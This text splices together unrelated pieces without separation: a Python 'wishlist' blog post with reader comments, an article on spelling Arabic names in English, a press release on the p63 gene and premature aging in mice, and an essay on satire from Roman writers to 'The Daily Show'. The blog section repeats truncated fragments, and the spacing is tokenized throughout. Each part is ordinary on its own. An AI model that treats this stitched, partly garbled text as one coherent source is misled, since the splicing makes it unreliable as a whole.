A fairly conservative set of additions to the syntax ( I note queries and the interface / etc extension above ) are better than macros .
Language - level continuations ( as opposed to the explicit continuation style used by Twisted ) are cool and all -- I do n't think they hurt -- but I do n't think they are actually very useful either .
That you can implement other things in terms of them does n't impress me either ; I 'm also pretty comfortable with a series of specific language features instead of one giant meta - feature , at least when it comes to control flow .
Continuation - based web frameworks ( like Seaside ) seem lame to me .
I 'm so much more impressed by event - based programming , and continuations ( used in that way ) seem like a way to avoid explicit events .
Events are the web .
Continuations are people who want to make the web into an MVC GUI .
GUIs are so twentieth century .
Grow up !
One thing I noticed from some recent Ruby criticisms I 've read is that its syntax errors can be hard to read -- and then I realized this is in part because you have to wait until the end of the file for the compiler to catch some syntax errors that a Python can catch immediately because of whitespace .
Put up with any significant - whitespace whining .
Here 99 % of the Python community is with me .
I think there is a meme that Python people are close - minded to suggestions for changes in the language .
I think there is significant truth to that .
But sometimes everyone else is just completely wrong .
I want nothing to do with any programmer who would mis-indent their code .
If you want to mis -indent your code you are an idiot .
If you want idiotic code to be an option you are being absurd .
Better signature unpacking , allowing def foo( * args , bar=None ) .
I think I saw something recently about this in python - dev , and it might happen before 3.0 .
Tuple - unpacking , like first , * rest = path.split('/' ) .
This would be mighty useful .
The guy who wrote the Jython review raves about Python packing ; this would be another fine enhancement to a delightful feature .
I desire this frequently .
A shortcut for for item in seq : yield item , when doing generator pass - through .
Maybe yield * seq .
Saw this on python - dev already .
As I use generators more I encounter this desire fairly frequently .
No sys.path crappiness .
Think this stuff through , one right way , no " search paths " ( implicit awfulness ) .
Careful or explicit relative imports .
Some improved exception messages .
I hate signature errors , for instance ; very unhelpful ( especially with the implicit - self - related counting error ) .
Python does pretty well -- lots of languages do a lot worse -- but I also think this is way up there in terms of usability and can always use improvement .
Traceback extensions , so you can better annotate your code in ways that will show up in tracebacks .
Similar in spirit to what Zope does with __traceback_info__ ( and what Paste copies ) .
But a built - in convention .
Really good cross-platform intra-Python interprocess communication .
This should look just like inter-microprocess communication , for process portability .
The first part ( freezing ) seems not - that - hard right now .
In theory you just put pickle and marshal together and you got it , so long as the module does n't do anything environment - dependent on startup ( modules could opt in or opt out or something with respect to their environment dependencies ) .
Copy - on - write is probably much much harder ; though maybe it's an extension of garbage collection algorithms .
Really fast interpreter startup .
That might make the reloading thing much less important .
I imagine frozen modules -- freezing the actual module in its full glory just as it looks immediately after import .
With copy - on - write in some fashion , to facilitate really fast microprocess startup too ( so microprocesses can share some set of modules so long as they are n't written to ) .
Microprocesses --
I have n't really used Erlang much , but I 'm still drawn to it more than any of the other languages in that branch ( the weird functional branch -- Haskell , ML , etc ) .
They do n't have microthreads ( as you might see in Stackless ) , but they are basically the same except without shared state .
Messages only .
I think that 's so much cooler than microthreads , at least if you can pull it off and still be fast and reliable .
Something like Pyrex but all polished and pretty .
Maybe RPython can be this .
Something better for forward - references .
I do n't know exactly what to call these -- except it means for references to things that do n't exist yet .
Like a reference to a class that may or may not exist yet .
Maybe this could be handled with a descriptor or something .
Give it a specific implementation and pattern , so people can use it more easily than having to build the pattern up from what 's there currently .
Delegation using __getattr__ and __setattr__ can be hard to work with , both creating delegates and consuming them .
I 'd like if there was more explicit support for this , with better failure conditions .
Maybe this just means a nice built - in metaclass that solves this problem particularly well .
I think double - underscore class - private variables ( like self .
__private ) are super - lame .
People think they are something they are not .
They are not really - truly - private variables .
They are I 'm - going - to - piss - people - off private variables .
They are I 'm - too - lazy - to - use - name - mangling private variables .
They are I 'm - going - to - break - subclassing private variables .
If you want class - private variables for a valid reason , explicit name mangling is in all ways better .
But I 'm not actually sure what to do .
I mentioned that here .
Some way of dealing with reloading .
Maybe just cleaning up reload ( ) ( making it overwrite classes instead of recreating them , for instance ) .
If that fancier reloading is part of the language , then people might be more careful about working so they do n't break it .
There would have to be an option of module - level functions __before_reload__ and __after_reload__ or something , so that even tricky code could fix itself up .
Some resolution to the anonymous function thing .
I agree completely with Guido -- anonymous functions and function - expressions beyond lambda do n't fit in Python .
I could care less if lambda goes away -- I just want something good and lambda is n't good ( I 'm not a minimalist ) .
I have n't figured out exactly what I want .
I would probably defer to the brainstorming of the Twisted guys and other people who frequently bang their heads on this .
Some order - by syntax .
Then you could do [ value for key , value in some_dict.items ( ) orderby value ] .
Right now you have to do [ value for key , value in sorted ( some_dict.items ( ) , key=lambda v : v [ 1 ] ) ] and that 's obviously not as nice .
Nice for the queries too .
Some query syntax for LINQ - like expressions -- that is , expressions which are introspectable and not run immediately .
SQLObject 's SQLBuilder ( similar things seen elsewhere ) is similar , but all hacky .
Stuff like this and this would be easier and cleaner with it .
Maybe something to clean up magic methods , like def *( other ) : .
This would n't clean up all magic methods , but would clean up several .
And right now , you actually can add a ' *' method to objects .
Maybe def '*'( other ) ?
Not a big deal ; magic methods are magic anyway , whatever name you give them .
I 'll admit this is a big backward compatibility issue .
But unicode has already introduced huge backward compatibility problems , but certain people are n't willing to admit it , and instead just call the issues " bugs " .
Yeah , there 's more bugs than non-bugs in the standard library , so I 'm unimpressed .
There would only be bytes and unicode , no str , none of these Unicode * Errors .
I hate those so much .
Everyone does .
And none of this " unicode is just intrinsically hard " crap .
That 's what slackers say about hard things .
Python 4 K will be a stand - up language , not some slacker language !
Something to handle the descriptor problem , where descriptors do n't know about what they are attached to .
Having tried several things related to this , handling subclassing is hard , but I think it 's important enough to make happen even if there are some inevitable warts .
Means IFoo = interface ( ' IFoo ' , ( Bar , ) , {'a ' : 1} ) .
You can kind of do that right now with metaclasses , but it feels very hacky , and Bar has to be designed for it .
Something more conservative might also be just fine .
It annoys me that attributes are unordered through these techniques .
But maybe not worth fixing .
We 'd get some kind of declarative / lazy language extension , maybe like this .
That turns class into one of several possible constructor arguments ( property being a notable second such addition ) .
Interface declarations could also be done more cleanly this way .
This means that :
Maybe class methods would n't be callable on instances .
But class variables should stay visible through instances .
That seems tricky at first , but I actually think it 's just a matter of a slightly different classmethod implementation .
cls would similarly become a keyword -- or maybe even allow class -- for class methods .
For symmetry as much as anything .
The self in method signatures would become optional .
self would be a keyword with special significance .
I regularly have bugs because of this -- mostly because I accidentally add self when calling methods on self , not because I leave them out of the function definition .
But still , I find this lame .
This is n't all backward compatible , but that said I 'm not inclined to suggest needless backward incompatibilities either .
Some people seem allergic to any " bloat " in a language , and obsess over removing things from builtins and elsewhere .
I find this silly .
Some people need to learn how to ignore what they do n't care about .
I was reading this unfinished article on Jython ( part of what looks to be very a good but also incomplete series of articles on JVM languages ) and he had a few criticisms / suggestions of Python .
I 've mentioned some minor things that annoy me before , but this made me want to collect them all , and list all the things I wish Python did .
Python 3 K is already taken , but I 'll up the ante -- Python 4 K will be the 33 % better than even Python 3 K .
( Note : implementation of Python 4 K is left an an exercise for the reader . )
Well , I do n't really need , or understand deeply , all the advanced / dynamic / metaclass features you 're asking for , so I 'll comment on the ones I care about .
Definite agreement : non-iterable strings
Object initialization
Microprocesses .
This is the holy Python grail for me .
They are so sweet in Erlang .
Better tuple unpacking .
Another win for Erlang that we could steal and improve .
I like your examples .
Same for signature unpacking .
Explicit relative imports .
orderby .
Better reload ( ) .
LINQ - like stuff .
Unicode - my number 2 behind microprocesses .
Questions :
You just say that __variables__ are lame , and mangling is better , without ever saying what you 'd do about them .
How does Python 4 k handle private variables / name mangling properly ?
Why are n't " ? " and " ! " worth allowing in function names ?
I want these , personally .
I feel like they would aid the descriptiveness of my code significantly .
( How about " - " ? )
I 'd add ( and I do n't follow python - dev , so forgive me if they exist / are coming soon ) : Built - in currying
local variable dump in exceptions , like in cgi module
Microprocesses .
Oh , did I mention that one already ?
ipython in the standard distribution
Real , Good , Pythonic , Documented , Cross - Platform GUI library .
We 're talking 4 k here right ?
Can we ever make this happen ?
By class - private variables I mean __private , not __magic__ .
Class - private variables are simply never needed .
If you have self .
__really_private you can just use self .
_MyClass_really_private for similar effect ( actually self .
_MyClass__really_private is the identical effect )
, not .
Class - private variables are simply never needed .
If you have you can just use for similar effect ( actually is the effect ) I think adding ?
and ! to function names ( or symbol names in general ) changes the feel of the language too much .
I 'd add them if I was starting from zero , but at this point I would n't want to use those because it would be too jarring against the bulk of existing code .
Dashes are , of course , completely out ;)
Also , they conflict with outside naming conventions , making some Python symbols hard to access from other languages .
I do n't know if this is a big deal in practice , but I think there 's something good about using a lowest - common - denominator in naming .
Case sensitivity is useful for the same reason ( though part of me would like to be case and underscore insensitive , to remove the source of needless style differences ) .
For the things you would add :
There is a proposal for a partial function , which I think is what you mean by currying .
Maybe in Python 2.5 ?
I personally do n't think it 's very readable in practice .
lambda actually not half bad for this one case .
function , which I think is what you mean by currying .
Maybe in Python 2.5 ?
I personally do n't think it 's very readable in practice .
actually not half bad for this one case .
I agree that a nicer interactive prompt -- roughly based on ipython I imagine -- would be very useful .
Local variable dumping is possible currently , but not enabled in the default traceback .
I do n't know if it should be -- I think it 's overwhelming except in interactive environments .
It should be included in more interactive environments ; maybe standard library support would help .
Goes with the __traceback_info__ stuff .
stuff .
GUI library ... seems too hard , even for 4K ;)
If it has n't happened outside of the standard library , how can it happen inside ?
Plus GUIs are the past , the web is the future ;) XUL will rock , though !
I 'll be all over that .
# Ian Bicking
Bill : Check out PEP 309 for the currying / partial functions thing .
http://www.python.org/peps/pep-0309.html.
According to the PEP , it 'll be in Python 2.5 .
PartialApplication is officially in for 2.5 I cannot resist pointing our my recipe here : http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/440557
It 's sortof PA ++ ;) # max khesin
I very much want to see ' locals ' and ' globals ' be sort of accessible keywords much like you suggest ' super ' and ' self ' , and also ' class ' .
It 'd make dealing with the various name - spaces a cinch .
Or maybe ' module ' instead of ' globals ' .
That 'd be nice .
Why Python 4 k ?
Since most of this is not backward compatible , I would be very thanksfull if you began making PEP 's for it all .
Personnally , do n't understand all the stuff there but I vote for : really fast interpreter startup
turns class into one of several possible constructor arguments
order by syntax
microprocesses ( do n't yet read about it but sounds cool ) .
About your assertion that GUI is old - style , I 'm not totally convinced but I really think , GUI should be able to use bookmarks , protocols and REST style programming .
What I see as a limitation in web style programming is the lack for " push " facilities .
Thanks for this wonderfull post .
The GUI stuff was really my slightly facetious rejection of those people who complain about how inelegent web programming is , and how it should be more like GUI programming .
I think they are just opening a can of worms for themselves , by trying to impose a style of programming they are familiar with to a domain where it is not appropriate .
Of course , I also think GUI programming is a bit retro all considered -- I genuinely think that as a user , not just as a programmer .
But that only directs my interest , it does n't really effect the language much one way or the other .
Some of these are n't language extensions per se , but just hard implementation problems : microprocesses are an example of that , as is interpreter startup .
I am hopeful that PyPy will open up this kind of development .
# Ian Bicking
Good Ideas but please let strings yield characters on iteration :-)
I 've much code using string iteration .
And self / cls should 'nt be keywords and should be the first parameter of method .
Really :)
String iteration just does n't make sense .
They do n't yield characters ... they just yield smaller strings .
Strings that contain strings that contain strings .
Strings just are n't containers in Python -- they are indexable , but to iterate something should be a container .
It 's only ( IMHO ) an accident of an earlier Python that did n't have the iterator protocol , that you can iterate over strings .
Strings should grow a method like . chars ( ) that yields all the characters .
Of course , not backward compatible , but the errors should be obvious ( " TypeError : strings are not iterable " ) .
I 've been thinking about the self thing more .
It 's one of the hardest to resolve issues ( and I doubt it will be resolved ) .
But I think it would be reasonable if functions defined in a class scope meant something different than a function defined outside of a class scope .
So if you were injecting a function definition into a class , it would ( reasonably ) work just like it does now , with an explicit self parameter .
But if you are doing it in a class scope , the metaclass ( type ) wraps the function in some fashion .
It seems less intrusive than class - private variables , even ( which are statically determined ) .
The self parameter also works badly with decorators , though the same might be true if that parameter was removed .
Getting a decorator to act properly with a method and with a function is hard .
# Ian Bicking
I certainly agree with some of the changes , like something as basic as proper relative imports .
But I think I hear too many " GUI is old style , the web is the future " comments from a lot of programmers that are more over - enthusiasm for new web technologies rather than a careful look at why we keep and discard old / new technologies in general .
As others have pointed out , even new asynchronous web technologies are still unidirectional in one sense : the client makes a request , and only then does the server send a reply .
Web servers do n't initiate requests to web browsers , although traditional networked GUI applications do this all the time .
In tech history , we 've gone from assembly language ( independent of hardware ) , to portable languages ( independent of assembly language ) , and now to various styles of cross- platform ( independent of OS or basic platform ) .
It 's not just the web , but any successful model of cross - platform apps that is the future .
The web is the future only because the browser is ubiquitous , but in the end I still have to install Firefox , etc. to be able to use the latest web technology .
With things like PyGTK and wxPython , I can have the same ubiquity for GUI apps too .
It 's all the same : I download the app through my browser when I visit a page , or I download the Python script and run it .
( P.S. I do agree with a lot of Ian 's points in general .
Sorry if this sounds like trolling ) .
I do n't personally find Python wishlists that interesting , especially the ones which propose language changes , but it 's good to see that you 've touched on issues with the runtime itself because that is where Python ( the platform ) should be innovating , or at least fixing itself a fair amount .
The problem is that because the language syntax is the thing most people have direct experience with ( and one can become superficially acquainted with Python in that way , provoking the " whitespace sucks " arguments offered by detractors / newcomers ) , people feel more inclined to suggest tweaks which frequently say more about their own habits ( at many different levels ) rather than to seriously think about some of the harder issues - things like concurrency , performance , predictability , memory usage and library support - and then provide improvements in those areas .
And when the harder issues do manage to enter the scene , proposals like optional static typing emerge : the arguably lazy and inadequate approach to dealing with such issues .
Certainly , I do n't see Python diminishing in ( relative ) popularity because of the lack of some language constructs or notation : it 's more likely to happen because Python does n't conveniently work well with or support other , popular technologies , is n't perceived to scale well ( in a way that involves convenient programming techniques ) , or is n't perceived to have good enough documentation - the latter being another story entirely .
My personal feeling is that a multi- line lambda is a mistake , like Guido says .
However , I agree with the functionally oriented people that having to use a local named function breaks code locality and tends to make it hard to follow the code in Python written with a more functional flavor .
I think that the right Pythonic answer is to introduce a syntax kind of like ruby blocks where a function call can optionally be followed by a colon , then arg list and a suite underneath and that the arguments and suite would be converted to a local function passed as the last argument to the function .
Here is an example : def open_in ( filename , block ) : f = open ( filename ) try : return block ( f ) finally : close ( f ) max_char = open_in( " foo.txt " ) : ( f ) x = 0 for l in f : x = max ( x , len( l ) ) return x
Or something like that .
There are a few warts :
The arg list of the anonymous block is awkward , maybe another colon at the end would help .
The block is a lexical closure , not in the same frame as the outside function so you get the usual assignment to local problem , but its worse because it looks like a suite in the local scope the same way for and while suites are .
That makes its more confusing .
and suites are .
That makes its more confusing .
In a similar vein you need a return or yield in the block to get a result out which makes simple things like reduce look painful ( but list comprehension saves filters and maps ) .
To see what I mean about the return or yield thing , here is an example .
First the new form of reduce : def reduce ( l , v , f ) : for x in l : v = f ( v , x ) return initial Now , the clunky way to write a sum : sum = reduce ( x , 0 ) : ( a , b ) return a+b Vs , the more elegant ( IMHO ) : sum = reduce ( x , 0 ) : ( a , b ) a+b
However , sum is a simple contrived example because of course sums , products , any , and all should be built in , and possibly the only real uses involve suites large enough that return or yield is help in understanding , instead of a hindrance .
" I actually like ? and !
in function names , as in Scheme .
But I do n't think it is worth adding . "
Scheme ?
I thought Ruby invented that ! ;)
In any case , I hear you on the whitespace with one exception : I wonder if comments should be exempt from that rule .
Sometimes it 's just easier to scan down through a file when the important comments are left - aligned .
Sometimes it 's just easier to scan down through a file when the important comments are left - aligned .
Ca n't you do that right now ?
I just tried it and it seems to work fine .

Surely you meant to write " py - in - the -sky " ?
I think making self .
something spellable as . something would be nice .
Not a big fan of that myself .
I guess I usually read code in my head on some level , and . something is n't readable in the same way self .
something is .
Also , that dot is really small .
As a separator that 's size fine -- good even -- but if it is an independent modifier that 's bothersome .
Plus I 'm not so much looking to save a few keystrokes by taking it out of the signature , as much as bringing some symmetry in signature and use .

" Turning = into an expression .
To generalize : dynamic typing adds some usually shallow errors in return for far more expressive code .
Assignment as an expression adds some really obnoxious errors ( ones that do n't raise exceptions ) in return for minor expressiveness .
That = is n't an expression catches me from making hard bugs almost every day ( instead they are easy syntax error bugs ) .
I 'd be fine with := as an assignment - expression , because I would n't misspell it .
That would certainly be useful .
The minimalists would hate this .
" I 'm guessing yu'll be using = for equality ?
I 'm guessing yu'll be using = for equality ?
No , nothing so dramatic ; instead adding := as another way to do assignment , allowed in expressions .
This is why minimalists would hate it ( and not without justification ) .
My real problem making assignment into an expression is that it 's really easy to spell == as = , with disasterous consequences .
It 's really hard to accidentally leave out an = and add in a : , so with := I do n't expect that typos will be too much of a problem .
# Ian Bicking
I like the way you 're handling self and cls .
One thing to note here is that any method that contains a self .
is an instance method , any method that contains a cls.
is a class method if it does n't contain a self .
as well .
If it contains neither , it 's a static method .
Both the classmethod and staticmethod functions go away .
Another minor point here is that allowing both self .
and cls. in the same method gives you access to the class object without any special syntax .
As far as the BBC is concerned , this may be three times too many , since its approved spelling of the Libyan leader 's name is " Gaddafi " .
Here at the Guardian , on the other hand , our policy is to call him Gadafy - something we have succeeded in doing 325 times on our website .
For good measure , we have also managed to write Gaddafi 42 times , Gadafi eight times , and Gaddafy and Qadhafi twice each .
If given a completely free choice in the matter , I would much prefer to call him Colonel Qadhdhaafiy because that spelling , besides being more faithful to the original Arabic , accurately reflects the eccentricity of the man .
Arguments about the ideal spelling of Arabic names go back at least to 1926 , when TE Lawrence ( " Lawrence of Arabia " ) sent his 130,000 - word manuscript of Revolt in the Desert to be typeset .
A sharp - eyed proofreader complained that it was " full of inconsistencies in the spelling of proper names , a point which reviewers often take up " .
Among other things , the proofreader noted that " Jeddah " alternated with " Jidda " throughout the book , while a man whose name began as Sherif Abd el Mayin later became el Main , el Mayein , el Muein , el Mayin and le Muyein .
Lawrence , who relished such vagaries , told his proofreader to get lost .
" Arabic names , " he replied , " wo n't go into English exactly , for their consonants are not the same as ours , and their vowels , like ours , vary from district to district .
" There are some ' scientific systems ' of transliteration , helpful to people who know enough Arabic not to need helping , but a washout for the world , " he continued .
" I spell my names anyhow , to show what rot the systems are . "
Up to a point , Lawrence was right .
Inconsistent spelling can certainly be consistent with the inconsistency of Arabic pronunciation , and in the 1920s - apart from the occasional tut - tutting book reviewer - nobody would have minded very much .
Today , though , life is more complicated .
Even the humble telephone directory is becoming a problem .
In Lawrence 's time there were few Arabs living in the London and even fewer with telephones .
But try looking them up today .
An Arab known as Hassan al - Mughrabi might be listed in any one of five places : as " Al Mughrabi " , " Al - Mughrabi " , " El Mughrabi " , " El - Mughrabi " or just plain " Mughrabi " .
Confusion over the spelling of Arab names that have been transcribed into the Roman alphabet can also lead to more serious problems .
Efforts by the FBI to track down Osama ( Usama ) bin Laden 's ( Ladin's ) supporters have been hampered by this , and a recent libel case in Britain was complicated by the way spellings of Arab names changed from document to document .
The obvious solution is to have a standard , internationally agreed , system for converting Arabic script to the Roman alphabet , but that is easier said than done .
For a start , only eight Arabic consonants - B , F , K , L , M , N , R , and Z - have an indisputably equivalent letter in the Roman alphabet .
Arabic also has two distinct consonants that sound like S , and the same applies to D , H and T .
In addition , there are some glottal sounds in Arabic that have no obvious Roman equivalent .
This leaves plenty of scope for scholarly debate , with the result that there are now many supposedly international standards .
One of the earliest was that adopted by the International Convention of Orientalist Scholars in 1936 .
Another was agreed in 1971 at a conference of Arab experts in Beirut and accepted - at least in theory - by the countries of the Arab League .
Besides these , there is ISO 233 , DIN 31635 and even a British standard , BS 4280 , which people are actively discouraged from finding out about or using .
The copyright of BS 4280 is closely guarded by the British Standards Institute which charges £ 28 ( $ 39 ) for an eight - page booklet explaining the system .
Slightly more successfully , the US Library of Congress and the American Library Association have issued " Romanisation tables " covering more than 150 languages and dialects ( including Arabic ) that are written in non-Roman scripts .
The system , originally devised for cataloguing books , has found its way into wider academic use , and detailed explanations of how it works can be found on several websites .
Meanwhile UNGEGN ( the United Nations group of experts on geographical names ) has spent the past 30 years trying to standardise the spelling of place names on maps and similar products with varying degrees of success .
There are several reasons why all these Romanisation systems have failed to catch on .
One is that they are too clever for general use , requiring dots , lines and other marks on certain letters which are impossible to achieve with a typewriter or ordinary word - processor - quite apart from baffling the average reader .
Another factor is that in some Arab countries - especially in North Africa - French is more widely spoken than English .
In these , the preference is to Romanise Arab names in ways that correspond more closely to French pronunciation .
So , for example , the Arab surname often spelled as Shaheen becomes Chahine in French - influenced countries .
There are also a lot of vaguely phonetic spellings - such as " Koran " and " Mecca " - that bear little relation to the Arabic spelling but entered popular usage many years ago and are now difficult to eradicate .
An internet search with Google shows that " Mecca " is used almost six times more often than " Makkah " ( the more accurate spelling that Muslims generally prefer ) .
In a similar search " Quran " scores 44 % , " Koran " 37 % , and " Qur'an " 19 % .
Spellings of the most common Arab name found by Google were : Muhammad 41 % , Mohammed 32 % , Mohamed 25 % , Mahomet 3 % .
Strictly speaking , there 's no reason why E or O should ever appear in an Arab name , since Arabic has only three vowels - A , I and U .
Many erroneous spellings have become so entrenched and familiar to us that more accurate versions leave us mystified on the rare occasions that we encounter them .
Last week I spotted a report in one of Britain 's least - read daily newspapers ( News Line , published by the Workers ' Revolutionary Party ) which mentioned a Palestinian politician called Sa'ib Urayqat .
After puzzling over this for a moment , I realised it was talking about the man usually known as Saeb Erekat .
The spelling adopted by the Workers ' Revolutionary Party is certainly more logical but , as the party ought to have discovered by now , having logic on your side does not necessarily attract followers .
Underlying the confusion is a tussle between the spoken and written word .
Early travellers to the Middle East usually wrote down words as they heard them ( or thought they heard them ) in ways that readers back home would find easy to pronounce .
This phonetic approach , which is the one Lawrence favoured , naturally takes account of any local quirks in pronunciation .
Some of the differences are significant - for example , J is pronounced as G in Egypt , while Q is pronounced as G in the Gulf - and the result is that a single Arabic word , spoken by a Moroccan , an Egyptian and a Saudi could easily appear as three different words if written phonetically in the Roman alphabet .
On the other hand , transcriptions based on the written form of Arab words ( which is standard throughout the region ) are less likely to be ambiguous in meaning , even if they miss out on local colour .
But the conflict between the written and spoken word is never likely to be fully resolved , especially in North Africa , where pronunciation differs greatly from classical written Arabic .
President Bouteflika of Algeria is one person whose name would become unrecognisable if transcribed classically .
Most of the ideas about how to transcribe ( or how not to transcribe ) Arabic words into the Roman alphabet were developed long before computers became an everyday tool - and now there are those who say the whole approach has been wrong .
So far , we have only been concerned with one - way transcription of Arab words into the Roman alphabet .
But in the future , with multilingual databases and so forth , we shall need to use the two alphabets interchangeably .
So , for example , electronic text in Arabic would have to be converted automatically into the Roman alphabet and then back again into flawless Arabic .
Research in this area has been led by the Xerox company , and there 's an interesting but technical discussion of the issues by Kenneth Beesley which can be found on the internet ( see links below ) .
At a more practical level , there 's an ingenious system called the Buckwalter Transliteration .
This was devised by Tim Buckwalter , a lexicographer , for sending Arabic - language emails from computers where the keyboard and display system allow only the Roman alphabet to be used .
These developments hold out some fascinating prospects for the future .
But I fear it will still be some time before the world agrees on how to spell Gadafy .
Researchers have discovered that the loss of a gene called p63 accelerates aging in mice .
Similar versions of the gene are present in many organisms , including humans .
Therefore , the p63 gene is likely to play a fundamental biological role in aging - related processes .
" To study how the p63 gene works , we devised a system for eliminating it from adult mouse tissues .
What struck us right away was that these p63 deficient mice were aging prematurely , " says Alea Mills of Cold Spring Harbor laboratory , who led the research .
Mice that are born without the p63 gene do not survive .
Therefore , Mills had previously conducted extensive studies of mice that are born with only one copy of the gene .
Still , these animals die at a young age .
So to study p63 function in adults , Mills and her colleagues devised a sophisticated molecular genetic technique that enabled them to eliminate both copies of the gene from particular tissues -- including skin and other multi-layered epithelial tissues -- after the animals reached maturity .
The effects of premature aging observed in these p63 deficient mice ( image available on request ) were hair loss , reduced fitness and body weight , progressive curvature of the spine , and a shortened lifespan .
" Aging and cancer are two sides of the same coin .
In one case , cells stop dividing and in the other , they can't stop dividing .
We suspect that having the right amount of the p63 protein in the right cells at the right time creates a balance that enables organisms to live relatively cancer - free for a reasonably long time , " says Mills , who adds that this is the first time the p63 gene has been implicated in aging .
" I first presented these results at a meeting in Tuscany .
I do n't want to sound flippant , but if you have to grow old somewhere , that 's about as good a place as any to do it , " says Mills .
The study is published in the September issue of the journal Genes & Development ( advance online publication August 17 ) .
The other researchers involved in the study were Scott Lowe , Ying Wu , Xuecui Guo , and first author William Keyes of Cold Spring Harbor Laboratory , and Hannes Vogel of Stanford University .
Researchers who did not participate in the study but are familiar with its findings include : Carol Prives ( Columbia University ) ; Judith Campisi ( Lawrence Berkeley National Laboratory ) ; David Lane ( University of Dundee ) ; Lawrence Donehower ( Baylor College of Medicine ) .
Which means , of course , that I ’m in luck : for that tone has been resonating through every echelon of American culture , a shift affecting and informing every storytelling medium , whether factual or fictional .
The Onion , of course , is only where my day gets cooking .
Other browser bookmarks send me to half a dozen sites where I hope to extract similarly intemperate snorts .
The best of these , for sure , I forward along to friends — fellow traffickers in yuks — who , young and old , unfailingly send me links found during their own morning frolics .
These I follow no less intrepidly than Theseus did Ariadne ’s thread , leading me , once again , out of my labyrinth of rage to that happier place : YouTube .
There , with a dependability that would make a demographer pump his fist and an advertiser lose his shirt , I watch segments from “ The Daily Show ” and its spinoff , “ The Colbert Report ” ( programs that , funnily enough , poached The Onion ’s top writers ) .
In such shows , then , I find that tone — so knowing , so over it , so smart , so asinine .
And given the choice , these days , between a smartass and , well , a dumb ass , even the Academy Awards , that most treacle - toned of evenings , picked this year ’s host from that clever category .
And picking the smartass , it seems , is what we ’ve been doing , across the televised board .
We ’ve been tuning in to “ The Simpsons ” ( in its 18th season , the longest - running sitcom in television history ) , which pokes tirelessly away at the idea of the American family , not to say America .
We ’ve been turning on “ South Park ” ( in its 10th season , the longest - running sitcom in cable - television history ) , with its bile - tongued children probing every asininity ( and which made a successful trip to the big screen in “ South Park : Bigger , Longer and Uncut ” ) .
We ’ve been ordering in “ Chappelle ’s Show ” ( the top - selling DVD of a television series in , well .
. . DVD history ) , with its now - embittered impresario , who , erewhile , was acid - tongued as he chewed up ( and out ) another cracker , whistling all the way .
We ’ve been showing up at “ The Office , ” in branches on either side of the Atlantic , each of which , with regionally adjusted inflections , paws away at its constricting white collar ( not to say its creator ’s later “ Extras ” — another kind of office , a celebrity waiting room with sexier furniture ) .
Like the soulless producer in the Coen brothers ’
“ Barton Fink , ” our Hollywood executives have been courting the equivalent of That Barton Fink Feeling : that ubiquitous tone — so “ young , ” so “ hip , ” so “ edgy . ”
Like the lava lamp of yore , it has been tucked into the hot corner of every room , whether “ Da Ali G Show , ” “ Curb Your Enthusiasm , ” “ Boondocks , ” “ American Dad ! , ” “ King of the Hill , ” “ The Thick of It ” or , on the big screen , the no less knowing “ Dawns ” — and Shaun — “ of the Dead , ” “ American Dreamz ” and “ Thank You for Smoking . ”
But if we were to think that that tone — so sarcastic , so ironic , so sardonic — were trapped within entertainments trundled onto screens , we would be wrong .
It has pervaded literary fiction for decades , from Joseph Heller ’s “ Catch - 22 ” to Philip Roth ’s “ Our Gang ” to David Foster Wallace ’s “ Infinite Jest . ”
No surprise , then , that it should feature in the work of our most heralded young authors of the past year , whether Gary Shteyngart ’s unbridled “ Absurdistan , ” Colson Whitehead ’s mocking “ Apex Hides the Hurt , ” Marisha Pessl ’s madcap “ Special Topics in Calamity Physics , ” not to mention books by our more seasoned storytellers —
“ In Persuasion Nation , ” by George Saunders ; “ The Diviners , ” by Rick Moody ; “ Little Children , ” by Tom Perotta ; and “ A Changed Man , ” by Francine Prose .
All of these varied entertainments — human emanations on the Web , on television , at the movies and between hardcovers ( whatever their differences in ambition , conception and achievement ) — are attuned to the ridiculous in modern life .
They are all , in other words , satirical : they revel in , and trade on , knowingness .
And if we seem to be enjoying a sort of golden age of the satirical , that invites the question
How successfully does satire serve our culture ?
That there is so much might seem proof of its expediency .
After all , what could be wrong with a mode of expression that orients a critical , comical eye to flaws in the contemporary weave ?
And yet , you might wonder , as well , whether a culture can have too much of that knowing tone and , if so , just what that “ too much ” might mean .
The ancient Romans provide the beginnings of an answer , in large measure because that ’s where satire has its beginnings .
Just as Americans like to claim jazz as “ our art form , ” the Romans claimed satire as theirs .
Gaius Lucilius ( second century B.C. ) was the first satirist , a writer vocal about the negative virtues of his fellow citizens — mostly the tendency to imitate their Greek neighbors in everything .
As boastful as a modern - day rapper , Lucilius pointed to himself as the original Roman — not some Helleno - wannabe — as much because of what he lampooned ( things Greek ) as the fact that he lampooned at all .
I am Roman , his writings say , hear me mock .
And indeed , it was how such criticism was delivered that made satire different — and differently effective — from , say , a sermon .
“ A cultivated wit , ” wrote Horace , a later Roman satirist , “ one that badgers less , can persuade all the more .
Artful ridicule can address contentious issues more competently and vigorously than can severity alone . ”
Sounding like the always - fulminating Lewis Black of “ The Daily Show , ” Rome ’s Juvenal tells us : “ It is harder not to write satire .
For who could endure this monstrous city , however callous at heart , and swallow his wrath ?. . . Today , every vice has reached its ruinous zenith .
So , satirist , hoist your sails . ”
The idiot wind , blowing every time Rome ’s hypocrites moved their mouths , drove her satirists , in their artful way , to bluster back , setting a course pursued by writers living in turbulent eras ever since .
When , in 1729 , the Tory politician Jonathan Swift ( 1667 -1745 ) published his satirical “ A Modest Proposal ” — which , in the straight - faced language of a sermon , advocated solving the problem of poverty by selling Irish children as meat — his mode was perfectly ironic .
Swift did not wish to see his countrymen ’s children ground into shepherd ’s pies .
Rather , he wanted to level an attack on political opponents who were devouring the Irish people .
Swift , then , was approaching a troubling question upside down and intimating a sarcastic answer .
( As such , Stephen Colbert , in parodying Bill O’Reilly ’s extreme rhetoric , is fully Swiftian : “ The Colbert Report ” works to convince us of the opposite of its host ’s every misguided opinion . )
For Swift ’s part , he believed that satire was a way of “ prompting men of genius and virtue to mend the world as far as they are able . ”
His fellow Augustan Alexander Pope wrote , “ When truth or virtue an affront endures , the affront is mine , my friend , and should be yours . ”
And although satire could not be a remedy in and of itself , it was doing a good deal , Pope assured , when it could “ deter , if not reform . ”
Indeed , this elegant , not to say defiant , means of addressing “ affronts ” to truth has proved a liberating mode of expression for authors across the ages , from Chaucer to Cervantes to Voltaire .
Most comprehensible of all , perhaps , is the attraction that so insubordinate a brand of comedy , a very free kind of speech , held for writers in a country formed through insubordination — our own .
